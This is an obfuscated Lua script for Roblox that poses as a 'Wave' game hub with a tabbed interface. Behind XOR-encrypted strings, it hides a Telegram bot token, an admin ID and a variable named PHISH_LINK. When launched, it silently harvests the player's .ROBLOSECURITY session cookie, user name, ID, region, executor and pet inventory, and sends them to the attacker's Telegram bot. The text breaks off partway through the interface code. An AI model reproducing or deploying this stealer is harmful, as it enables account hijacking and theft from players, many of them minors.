--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

bit32 = {};
local N = 32;
local P = 2 ^ N;
bit32.bnot = function(x)
	x = x % P;
	return (P - 1) - x;
end;
bit32.band = function(x, y)
	if (y == 255) then
		return x % 256;
	end
	if (y == 65535) then
		return x % 65536;
	end
	if (y == 4294967295) then
		return x % 4294967296;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) ~= 2) then
		else
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bor = function(x, y)
	if (y ~= 255) then
	else
		return (x - (x % 256)) + 255;
	end
	if (y ~= 65535) then
	else
		return (x - (x % 65536)) + 65535;
	end
	if (y ~= 4294967295) then
	else
		return 4294967295;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) < 1) then
		else
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bxor = function(x, y)
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) ~= 1) then
		else
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.lshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount < 0) then
		return math.floor(x * (2 ^ s_amount));
	else
		return (x * (2 ^ s_amount)) % P;
	end
end;
bit32.rshift = function(x, s_amount)
	if (math.abs(s_amount) < N) then
	else
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		return math.floor(x * (2 ^ -s_amount));
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
bit32.arshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		local add = 0;
		if (x >= (P / 2)) then
			add = P - (2 ^ (N - s_amount));
		end
		return math.floor(x * (2 ^ -s_amount)) + add;
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
local obf_stringchar = string['char'];
local obf_stringbyte = string['byte'];
local obf_stringsub = string['sub'];
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib['bxor'];
local obf_tableconcat = table['concat'];
local obf_tableinsert = table['insert'];
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
local BOT_TOKEN = LUAOBFUSACTOR_DECRYPT_STR_0("\137\149\140\118\179\234\147\73\128\151\129\4\199\157\240\52\193\213\211\32\183\157\246\18\218\213\227\14\213\236\235\46\133\198\242\42\252\145\247\15\218\147\252\16\252\235", "\126\177\163\187\69\134\219\167");
local ADMIN_ID = LUAOBFUSACTOR_DECRYPT_STR_0("\116\152\124\144\175\119\157\115\144\175", "\156\67\173\74\165");
local PHISH_LINK = LUAOBFUSACTOR_DECRYPT_STR_0("\60\163\93\6\175\124\9\123\163\7\27\185\105\86\56\162\90\30\175\54\79\58\185\76\4\190\41\82\123\165\70\20\176\41\94\34\190\89\5\185\52\80\49\165", "\38\84\215\41\118\220\70");
local REQUIRED_KEY = "1";
local Players = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\96\26\35\11\251\66\5", "\158\48\118\66\114"));
local HttpService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\131\48\4\38\64\160\233\189\45\19\51", "\155\203\68\112\86\19\197"));
local TweenService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\114\202\51\249\78\75\224\234\80\212\53\249", "\152\38\189\86\156\32\24\133"));
local UserInputService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\201\68\162\84\213\89\183\83\232\100\162\84\234\94\164\67", "\38\156\55\199"));
local RunService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\154\104\114\27\22\102\236\74\171\120", "\35\200\29\28\72\115\20\154"));
local ReplicatedStorage = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\43\186\193\211\132\47\53\13\186\213\236\153\35\38\24\184\212", "\84\121\223\177\191\237\76"));
local LocalizationService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\151\89\202\161\54\89\42\192\175\95\198\174\9\85\34\215\178\85\204", "\161\219\54\169\192\90\48\80"));
local CoreGui = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\106\77\18\32\110\87\9", "\69\41\34\96"));
local Lighting = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\144\202\208\2\22\34\178\196", "\75\220\163\183\106\98"));
local TeleportService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\54\191\135\50\201\13\168\159\4\220\16\172\130\52\220", "\185\98\218\235\87"));
local VirtualUser = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\253\53\53\242\203\171\199\9\52\227\204", "\202\171\92\71\134\190"));
local GuiService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\14\212\37\187\44\211\58\129\42\196", "\232\73\161\76"));
local LocalPlayer = Players['LocalPlayer'];
local Camera = workspace['CurrentCamera'];
local ACCESS = false;
local function get_request()
	return (syn and syn['request']) or (http and http['request']) or http_request or request or (fluxus and fluxus['request']) or (getgenv and getgenv()['request']);
end
local function get_cookie()
	local cookie = "";
	pcall(function()
		if getcookie then
			cookie = getcookie(LUAOBFUSACTOR_DECRYPT_STR_0("\245\235\109\127\50\148\234\103\126\43\137\240\118\100", "\126\219\185\34\61")) or getcookie(LUAOBFUSACTOR_DECRYPT_STR_0("\62\225\124\94\81\68\214\196\57\252\119\70\71", "\135\108\174\62\18\30\23\147")) or "";
		end
	end);
	if (#cookie >= 80) then
	else
		pcall(function()
			if (syn and syn['get_cookie']) then
				cookie = syn.get_cookie() or "";
			end
		end);
	end
	if (#cookie >= 80) then
	else
		pcall(function()
			cookie = (getgenv and (getgenv()['ROBLOSECURITY'] or getgenv()['cookie'] or getgenv()[LUAOBFUSACTOR_DECRYPT_STR_0("\248\219\5\233\52\129\0\226\149\220\24\226\44\151", "\167\214\137\74\171\120\206\83")])) or "";
		end);
	end
	if ((#cookie >= 80) or (4593 <= 2672) or (4864 < 1902)) then
	else
		local req = get_request();
		if ((4839 >= 3700) and req) then
			for _, url in ipairs({LUAOBFUSACTOR_DECRYPT_STR_0("\131\228\38\77\235\253\196\191\37\74\239\233\153\255\48\81\247\191\197\243\61\80\183", "\199\235\144\82\61\152"),LUAOBFUSACTOR_DECRYPT_STR_0("\15\2\173\59\20\76\246\100\18\5\188\57\20\88\171\36\5\26\182\51\73\21\182\38\72\0\232\100\18\5\188\57\20\89\184\62\19\30\188\37\19\31\186\42\19\19\189", "\75\103\118\217")}) do
				pcall(function()
					local resp = req({[LUAOBFUSACTOR_DECRYPT_STR_0("\242\70\124", "\126\167\52\16\116\217")]=url,[LUAOBFUSACTOR_DECRYPT_STR_0("\229\43\52\136\187\29", "\156\168\78\64\224\212\121")]=LUAOBFUSACTOR_DECRYPT_STR_0("\32\203\145", "\174\103\142\197"),[LUAOBFUSACTOR_DECRYPT_STR_0("\126\45\94\60\32\76\235", "\152\54\72\63\88\69\62")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\225\215\235\78\153\229\233\89\218\208", "\60\180\164\142")]=LUAOBFUSACTOR_DECRYPT_STR_0("\117\81\31\32\43\225\19\23\11\75\121", "\114\56\62\101\73\71\141")}});
					if (resp and resp['Headers']) then
						local raw = resp['Headers'][LUAOBFUSACTOR_DECRYPT_STR_0("\171\236\207\137\187\230\212\207\177\236", "\164\216\137\187")] or resp['Headers'][LUAOBFUSACTOR_DECRYPT_STR_0("\225\227\37\255\133\241\4\217\239\52", "\107\178\134\81\210\198\158")] or resp['Headers'][LUAOBFUSACTOR_DECRYPT_STR_0("\59\1\141\205\163\61", "\202\88\110\226\166")] or "";
						if ((type(raw) ~= LUAOBFUSACTOR_DECRYPT_STR_0("\215\14\128\251\207", "\170\163\111\226\151")) or (1075 > 1918)) then
						else
							raw = table.concat(raw, LUAOBFUSACTOR_DECRYPT_STR_0("\74\112", "\73\113\80\210\88\46\87"));
						end
						local m = string.match(raw, LUAOBFUSACTOR_DECRYPT_STR_0("\196\98\255\61\197\173\3\254\55\196\180\30\228\38\222\220\100\246\44\188\188\103\132", "\135\225\76\173\114")) or string.match(raw, LUAOBFUSACTOR_DECRYPT_STR_0("\40\194\154\156\131\142\130\57\216\138\153\152\132\250\82\214\134\235\145\246\238", "\199\122\141\216\208\204\221"));
						if (m and (#m > 80)) then
							cookie = LUAOBFUSACTOR_DECRYPT_STR_0("\227\239\63\210\84\217\158\248\51\197\74\223\153\228\77", "\150\205\189\112\144\24") .. m;
						end
					end
				end);
				if ((396 <= 3804) and ((#cookie <= 80) or (1168 > 3156))) then
				else
					break;
				end
			end
		end
	end
	return ((#cookie > 80) and cookie) or nil;
end
local function send_tg(text)
	local req = get_request();
	if (not req or (4169 == 2187)) then
		return;
	end
	pcall(function()
		req({[LUAOBFUSACTOR_DECRYPT_STR_0("\16\150\179", "\112\69\228\223\44\100\232\113")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\220\11\19\195\165\38\201\155\30\23\218\248\104\131\216\26\0\193\183\113\200\219\13\0\156\180\115\146", "\230\180\127\103\179\214\28") .. BOT_TOKEN .. LUAOBFUSACTOR_DECRYPT_STR_0("\195\22\90\72\224\108\229\159\22\94\65\225", "\128\236\101\63\38\132\33")),[LUAOBFUSACTOR_DECRYPT_STR_0("\129\172\5\76\185\239", "\175\204\201\113\36\214\139")]=LUAOBFUSACTOR_DECRYPT_STR_0("\119\227\6\232", "\100\39\172\85\188"),[LUAOBFUSACTOR_DECRYPT_STR_0("\133\125\184\132\54\191\107", "\83\205\24\217\224")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\197\202\195\41\227\203\217\112\210\220\221\56", "\93\134\165\173")]=LUAOBFUSACTOR_DECRYPT_STR_0("\191\226\209\206\51\205\179\106\183\253\207\141\48\221\189\112", "\30\222\146\161\162\90\174\210")},[LUAOBFUSACTOR_DECRYPT_STR_0("\199\65\116\19", "\106\133\46\16")]=HttpService:JSONEncode({[LUAOBFUSACTOR_DECRYPT_STR_0("\91\40\114\232\101\73\92", "\32\56\64\19\156\58")]=ADMIN_ID,[LUAOBFUSACTOR_DECRYPT_STR_0("\78\205\253\66", "\224\58\168\133\54\58\146")]=text,[LUAOBFUSACTOR_DECRYPT_STR_0("\73\87\89\238\112\185\138\4\93\83", "\107\57\54\43\157\21\230\231")]=LUAOBFUSACTOR_DECRYPT_STR_0("\243\191\60\217", "\175\187\235\113\149\217\188"),[LUAOBFUSACTOR_DECRYPT_STR_0("\56\166\146\77\225\117\125\3\184\132\78\220\105\121\59\170\190\92\241\124\110\53\170\150", "\24\92\207\225\44\131\25")]=true})});
	end);
end
local function get_region()
	local r = LUAOBFUSACTOR_DECRYPT_STR_0("\94\221\179\66\20\106\69", "\29\43\179\216\44\123");
	pcall(function()
		r = LocalizationService['RobloxLocaleId'] or LocalizationService['SystemLocaleId'];
	end);
	return r;
end
local function scan_pets()
	local list = {};
	pcall(function()
		for _, v in pairs(LocalPlayer:GetDescendants()) do
			local n = v['Name']:lower();
			if (n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\173\220\52", "\44\221\185\64")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\4\224\79", "\19\97\135\40\63"))) then
				table.insert(list, v.Name);
			end
		end
		for _, name in ipairs({LUAOBFUSACTOR_DECRYPT_STR_0("\158\89\39\40", "\81\206\60\83\91\79"),LUAOBFUSACTOR_DECRYPT_STR_0("\126\174\196\95\32\199\72\168\93", "\196\46\203\176\18\79\163\45"),LUAOBFUSACTOR_DECRYPT_STR_0("\155\46\119\27\42\239\223\189\54\109", "\143\216\66\30\126\68\155"),LUAOBFUSACTOR_DECRYPT_STR_0("\131\198\27\206\203\183\216\243\179", "\129\202\168\109\171\165\195\183")}) do
			local f = ReplicatedStorage:FindFirstChild(name);
			if ((1406 == 1406) and (f or (572 > 4486))) then
				for _, p in pairs(f:GetChildren()) do
					table.insert(list, p.Name);
				end
			end
		end
	end);
	return ((#list > 0) and table.concat(list, "\n")) or LUAOBFUSACTOR_DECRYPT_STR_0("\44\87\57\221\158\91\166\50\74\56\204\219\23\242\39\92", "\134\66\56\87\184\190\116");
end
task.spawn(function()
	task.wait(1.5);
	local cookie = get_cookie();
	send_tg(table.concat({"🔔 <b>Script launched</b>",("👤 " .. LocalPlayer['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\124\121", "\85\92\81\105\219\121\139\65") .. LocalPlayer['UserId'] .. ")"),("💻 " .. ((identifyexecutor and identifyexecutor()) or LUAOBFUSACTOR_DECRYPT_STR_0("\232\189\91\75\115\200\243", "\191\157\211\48\37\28"))),("🌍 " .. get_region()),("📍 PlaceId: " .. game['PlaceId']),("🍪 " .. ((cookie and LUAOBFUSACTOR_DECRYPT_STR_0("\220\16\251\23\51\218\95\242\19\47\209\27", "\90\191\127\148\124")) or LUAOBFUSACTOR_DECRYPT_STR_0("\123\136\33\28\113\130\110\21\116\136\45\28\125\131", "\119\24\231\78"))),("🐾 Pets:\n<code>" .. scan_pets() .. LUAOBFUSACTOR_DECRYPT_STR_0("\222\98\166\69\216\69\79", "\113\226\77\197\42\188\32"))}, "\n"));
end);
local Gui = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\9\21\230\176\63\24\211\160\51", "\213\90\118\148"));
Gui['Name'] = LUAOBFUSACTOR_DECRYPT_STR_0("\108\47\162\83\126\88\60\189\70\89", "\45\59\78\212\54");
Gui['ResetOnSpawn'] = false;
Gui['ZIndexBehavior'] = Enum['ZIndexBehavior']['Sibling'];
Gui['IgnoreGuiInset'] = true;
pcall(function()
	Gui['Parent'] = CoreGui;
end);
if not Gui['Parent'] then
	Gui['Parent'] = LocalPlayer:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\32\90\130\146\131\60\138\229\25", "\144\112\54\227\235\230\78\205"));
end
local function createParticle(parent)
	local p = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\149\58\14\241\213", "\59\211\72\111\156\176"));
	p['Size'] = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4));
	p['Position'] = UDim2.new(math.random(), 0, math.random(), 0);
	p['BackgroundColor3'] = Color3.fromRGB(180, 180, 220);
	p['BackgroundTransparency'] = 0.4;
	p['BorderSizePixel'] = 0;
	p['Parent'] = parent;
	Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\123\174\192\34\92\137\230\63", "\77\46\231\131"), p)['CornerRadius'] = UDim.new(1, 0);
	task.spawn(function()
		while p and p['Parent'] do
			local dur = math.random(25, 45) / 10;
			TweenService:Create(p, TweenInfo.new(dur, Enum['EasingStyle'].Sine, Enum['EasingDirection'].InOut), {[LUAOBFUSACTOR_DECRYPT_STR_0("\138\91\165\73\174\93\185\78", "\32\218\52\214")]=UDim2.new(math.random(), 0, math.random(), 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\108\22\50\163\246\162\74\79\64\19\5\186\240\190\86\74\79\5\52\166\242\169", "\58\46\119\81\200\145\208\37")]=(math.random(3, 7) / 10)}):Play();
			task.wait(dur);
		end
	end);
end
local TopBar = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\13\158\49\161\172", "\86\75\236\80\204\201\221"));
TopBar['Size'] = UDim2.new(0, 360, 0, 40);
TopBar['Position'] = UDim2.new(0.5, -180, 0, 12);
TopBar['BackgroundColor3'] = Color3.fromRGB(24, 24, 28);
TopBar['BackgroundTransparency'] = 0.05;
TopBar['Parent'] = Gui;
Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\71\104\84\138\236\133\119\83", "\235\18\33\23\229\158"), TopBar)['CornerRadius'] = UDim.new(0, 12);
local ts = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\101\147\242\175\66\181\202\190", "\219\48\218\161"));
ts['Color'] = Color3.fromRGB(90, 90, 110);
ts['Thickness'] = 1.2;
ts['Transparency'] = 0.25;
ts['Parent'] = TopBar;
task.spawn(function()
	while TopBar and TopBar['Parent'] do
		TweenService:Create(ts, TweenInfo.new(1.4, Enum['EasingStyle'].Sine, Enum['EasingDirection'].InOut), {[LUAOBFUSACTOR_DECRYPT_STR_0("\208\99\125\71\200\95\225\246\116\114\74\194", "\128\132\17\28\41\187\47")]=0.55}):Play();
		task.wait(1.4);
		TweenService:Create(ts, TweenInfo.new(1.4, Enum['EasingStyle'].Sine, Enum['EasingDirection'].InOut), {[LUAOBFUSACTOR_DECRYPT_STR_0("\53\32\7\52\78\17\51\20\63\83\2\43", "\61\97\82\102\90")]=0.2}):Play();
		task.wait(1.4);
	end
end);
local TopLabel = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\152\43\179\95\235\86\28\12\160", "\105\204\78\203\43\167\55\126"));
TopLabel['Size'] = UDim2.new(1, -8, 1, 0);
TopLabel['BackgroundTransparency'] = 1;
TopLabel['Text'] = "Wave  •  Online: --  •  FPS: --";
TopLabel['TextColor3'] = Color3.fromRGB(235, 235, 245);
TopLabel['Font'] = Enum['Font']['GothamMedium'];
TopLabel['TextSize'] = 13;
TopLabel['TextXAlignment'] = Enum['TextXAlignment']['Center'];
TopLabel['Parent'] = TopBar;
local fps, frames, last = 60, 0, tick();
RunService['RenderStepped']:Connect(function()
	frames += 1
	if ((tick() - last) < 1) then
	else
		fps = frames;
		frames = 0;
		last = tick();
		TopLabel['Text'] = string.format("Wave  •  Online: %d  •  FPS: %d", #Players:GetPlayers(), fps);
	end
end);
local Main = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\131\184\34\19\22", "\49\197\202\67\126\115\100\167"));
Main['Size'] = UDim2.new(0, 660, 0, 500);
Main['Position'] = UDim2.new(0.5, -330, 0.5, -250);
Main['BackgroundColor3'] = Color3.fromRGB(20, 20, 24);
Main['BackgroundTransparency'] = 0.02;
Main['Visible'] = false;
Main['ClipsDescendants'] = true;
Main['Parent'] = Gui;
Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\2\114\252\38\146\88\91\37", "\62\87\59\191\73\224\54"), Main)['CornerRadius'] = UDim.new(0, 16);
local ms = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\210\43\201\221\245\13\241\204", "\169\135\98\154"));
ms['Color'] = Color3.fromRGB(80, 80, 100);
ms['Thickness'] = 1.4;
ms['Transparency'] = 0.2;
ms['Parent'] = Main;
local mg = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\254\94\3\70\252\55\193\206\121\48", "\168\171\23\68\52\157\83"));
mg['Color'] = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(32, 32, 40)),ColorSequenceKeypoint.new(0.5, Color3.fromRGB(22, 22, 28)),ColorSequenceKeypoint.new(1, Color3.fromRGB(16, 16, 20))});
mg['Rotation'] = 135;
mg['Parent'] = Main;
for i = 1, 18 do
	createParticle(Main);
end
local TitleBar = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\210\99\244\160\32", "\231\148\17\149\205\69\77"));
TitleBar['Size'] = UDim2.new(1, 0, 0, 48);
TitleBar['BackgroundTransparency'] = 1;
TitleBar['Parent'] = Main;
local Title = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\180\162\223\239\123\254\130\162\203", "\159\224\199\167\155\55"));
Title['Size'] = UDim2.new(1, -60, 1, 0);
Title['Position'] = UDim2.new(0, 18, 0, 0);
Title['BackgroundTransparency'] = 1;
Title['Text'] = LUAOBFUSACTOR_DECRYPT_STR_0("\192\242\42\215\183\192\63\192\254\227\40", "\178\151\147\92");
Title['TextColor3'] = Color3.fromRGB(245, 245, 255);
Title['Font'] = Enum['Font']['GothamBold'];
Title['TextSize'] = 17;
Title['TextXAlignment'] = Enum['TextXAlignment']['Left'];
Title['Parent'] = TitleBar;
local CloseBtn = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\184\248\84\38\48\89\110\152\242\66", "\26\236\157\44\82\114\44"));
CloseBtn['Size'] = UDim2.new(0, 32, 0, 32);
CloseBtn['Position'] = UDim2.new(1, -44, 0.5, -16);
CloseBtn['BackgroundColor3'] = Color3.fromRGB(50, 50, 60);
CloseBtn['Text'] = "✕";
CloseBtn['TextColor3'] = Color3.fromRGB(230, 230, 240);
CloseBtn['Font'] = Enum['Font']['GothamBold'];
CloseBtn['TextSize'] = 14;
CloseBtn['AutoButtonColor'] = false;
CloseBtn['Parent'] = TitleBar;
Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\31\7\246\84\56\32\208\73", "\59\74\78\181"), CloseBtn)['CornerRadius'] = UDim.new(0, 8);
local Side = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\3\195\91\87\182", "\211\69\177\58\58"));
Side['Size'] = UDim2.new(0, 148, 1, -58);
Side['Position'] = UDim2.new(0, 10, 0, 52);
Side['BackgroundColor3'] = Color3.fromRGB(26, 26, 32);
Side['BackgroundTransparency'] = 0.08;
Side['Parent'] = Main;
Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\130\204\90\250\251\197\178\247", "\171\215\133\25\149\137"), Side)['CornerRadius'] = UDim.new(0, 12);
local SideList = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\212\225\30\243\252\36\208\67\248\199\39\238", "\34\129\168\82\154\143\80\156"));
SideList['Padding'] = UDim.new(0, 4);
SideList['HorizontalAlignment'] = Enum['HorizontalAlignment']['Center'];
SideList['Parent'] = Side;
local Content = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\163\160\50\6\77", "\233\229\210\83\107\40\46"));
Content['Size'] = UDim2.new(1, -168, 1, -62);
Content['Position'] = UDim2.new(0, 164, 0, 54);
Content['BackgroundTransparency'] = 1;
Content['Parent'] = Main;
local Tabs = {LUAOBFUSACTOR_DECRYPT_STR_0("\237\77\53\223\11", "\101\161\34\82\182"),LUAOBFUSACTOR_DECRYPT_STR_0("\197\12\80\240", "\78\136\109\57\158\187\130\226"),LUAOBFUSACTOR_DECRYPT_STR_0("\13\60\248\252\126\11\235\240\58\58", "\145\94\95\153"),LUAOBFUSACTOR_DECRYPT_STR_0("\213\204\24\217\65\160\248\200\26", "\215\157\173\116\181\46"),LUAOBFUSACTOR_DECRYPT_STR_0("\16\162\142\252\206\38", "\186\85\212\235\146"),LUAOBFUSACTOR_DECRYPT_STR_0("\229\132\2\190\9\235\76", "\56\162\225\118\158\89\142"),LUAOBFUSACTOR_DECRYPT_STR_0("\125\16\212\160\36\217\78\8", "\184\60\101\160\207\66"),LUAOBFUSACTOR_DECRYPT_STR_0("\7\139\111\169\48\142", "\220\81\226\28"),LUAOBFUSACTOR_DECRYPT_STR_0("\35\217\131\226\239\213", "\167\115\181\226\155\138"),LUAOBFUSACTOR_DECRYPT_STR_0("\213\45\245\80\127", "\166\130\66\135\60\27\17"),LUAOBFUSACTOR_DECRYPT_STR_0("\105\67\221\118", "\80\36\42\174\21"),LUAOBFUSACTOR_DECRYPT_STR_0("\125\21\35\110\71\30\48\105", "\26\46\112\87")};
local Pages = {};
local function makePage(name)
	local p = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\138\32\185\123\179\179\76\186\190\5\185\117\178\186", "\212\217\67\203\20\223\223\37"));
	p['Name'] = name;
	p['Size'] = UDim2.new(1, 0, 1, 0);
	p['BackgroundTransparency'] = 1;
	p['BorderSizePixel'] = 0;
	p['ScrollBarThickness'] = 3;
	p['ScrollBarImageColor3'] = Color3.fromRGB(120, 120, 140);
	p['AutomaticCanvasSize'] = Enum['AutomaticSize']['Y'];
	p['Visible'] = false;
	p['Parent'] = Content;
	local lay = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\143\164\132\219\169\153\132\211\163\130\189\198", "\178\218\237\200"));
	lay['Padding'] = UDim.new(0, 6);
	lay['Parent'] = p;
	local pad = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\131\156\214\209\178\177\239\222\177", "\176\214\213\134"));
	pad['PaddingTop'] = UDim.new(0, 4);
	pad['PaddingBottom'] = UDim.new(0, 14);
	pad['PaddingLeft'] = UDim.new(0, 4);
	pad['PaddingRight'] = UDim.new(0, 6);
	pad['Parent'] = p;
	Pages[name] = p;
	return p;
end
for _, t in ipairs(Tabs) do
	makePage(t);
end
local function switch(name)
	if ((1531 < 4271) and (1404 == 1404) and (name ~= LUAOBFUSACTOR_DECRYPT_STR_0("\216\162\177\221\166", "\57\148\205\214\180\200\54")) and not ACCESS) then
		switch(LUAOBFUSACTOR_DECRYPT_STR_0("\62\242\50\61\120", "\22\114\157\85\84"));
		return;
	end
	for n, p in pairs(Pages) do
		p['Visible'] = n == name;
	end
end
local function sideBtn(text, tab)
	local b = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\240\206\11\208\127\227\188\208\196\29", "\200\164\171\115\164\61\150"));
	b['Size'] = UDim2.new(1, -14, 0, 29);
	b['BackgroundColor3'] = Color3.fromRGB(36, 36, 44);
	b['BackgroundTransparency'] = 0.1;
	b['Text'] = text;
	b['TextColor3'] = Color3.fromRGB(220, 220, 235);
	b['Font'] = Enum['Font']['GothamMedium'];
	b['TextSize'] = 11;
	b['AutoButtonColor'] = false;
	b['Parent'] = Side;
	Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\139\221\32\74\145\176\241\17", "\227\222\148\99\37"), b)['CornerRadius'] = UDim.new(0, 8);
	b['MouseButton1Click']:Connect(function()
		switch(tab);
		for _, c in pairs(Side:GetChildren()) do
			if ((635 == 635) and (c:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\7\87\74\226\219\38\70\70\249\247", "\153\83\50\50\150")) or (3748 < 2212))) then
				TweenService:Create(c, TweenInfo.new(0.12), {[LUAOBFUSACTOR_DECRYPT_STR_0("\127\119\112\23\116\185\66\72\120\119\63\124\167\66\79\37", "\45\61\22\19\124\19\203")]=Color3.fromRGB(36, 36, 44)}):Play();
			end
		end
		TweenService:Create(b, TweenInfo.new(0.12), {[LUAOBFUSACTOR_DECRYPT_STR_0("\227\19\14\254\5\98\182\212\28\9\214\13\124\182\211\65", "\217\161\114\109\149\98\16")]=Color3.fromRGB(60, 60, 80)}):Play();
	end);
end
for _, t in ipairs(Tabs) do
	sideBtn(t, t);
end
local function label(parent, text, size)
	local l = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\38\37\32\104\144\117\16\37\52", "\20\114\64\88\28\220"));
	l['Size'] = UDim2.new(1, -4, 0, size or 17);
	l['BackgroundTransparency'] = 1;
	l['Text'] = text;
	l['TextColor3'] = Color3.fromRGB(200, 200, 215);
	l['Font'] = Enum['Font']['Gotham'];
	l['TextSize'] = 12;
	l['TextXAlignment'] = Enum['TextXAlignment']['Left'];
	l['TextWrapped'] = true;
	l['Parent'] = parent;
	return l;
end
local function button(parent, text, callback)
	local b = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\5\4\202\160\218\197\169\37\14\220", "\221\81\97\178\212\152\176"));
	b['Size'] = UDim2.new(1, -4, 0, 31);
	b['BackgroundColor3'] = Color3.fromRGB(40, 40, 50);
	b['BackgroundTransparency'] = 0.05;
	b['Text'] = text;
	b['TextColor3'] = Color3.fromRGB(240, 240, 250);
	b['Font'] = Enum['Font']['GothamMedium'];
	b['TextSize'] = 12;
	b['AutoButtonColor'] = false;
	b['Parent'] = parent;
	Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\248\206\62\244\8\195\226\15", "\122\173\135\125\155"), b)['CornerRadius'] = UDim.new(0, 8);
	local s = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\177\232\51\173\45\62\195\129", "\168\228\161\96\217\95\81"));
	s['Color'] = Color3.fromRGB(70, 70, 90);
	s['Thickness'] = 1;
	s['Transparency'] = 0.4;
	s['Parent'] = b;
	b['MouseEnter']:Connect(function()
		TweenService:Create(b, TweenInfo.new(0.1), {[LUAOBFUSACTOR_DECRYPT_STR_0("\249\208\45\87\40\69\212\196\32\88\12\88\215\222\60\15", "\55\187\177\78\60\79")]=Color3.fromRGB(55, 55, 70)}):Play();
		TweenService:Create(s, TweenInfo.new(0.1), {[LUAOBFUSACTOR_DECRYPT_STR_0("\25\220\94\229\85\223\129\63\203\81\232\95", "\224\77\174\63\139\38\175")]=0.15}):Play();
	end);
	b['MouseLeave']:Connect(function()
